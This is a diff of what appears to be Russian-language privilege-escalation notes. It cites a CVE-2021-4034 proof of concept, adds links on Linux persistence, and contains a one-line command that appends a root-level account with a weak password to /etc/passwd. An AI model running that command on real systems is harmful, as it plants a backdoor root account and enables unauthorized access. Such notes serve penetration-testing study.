@@ -139,3 +139,8 @@ poc - https://github.com/arthepsy/CVE-2021-4034
 # Добавление пользователя с правами root в /etc/passwd
 
         echo "boot:$(openssl passwd -6 -salt boot password123):0:0:boot:/root:/bin/bash" >> /etc/passwd
+
+# Закрепление в системе
+
+        https://habr.com/ru/articles/568298/
+        https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md
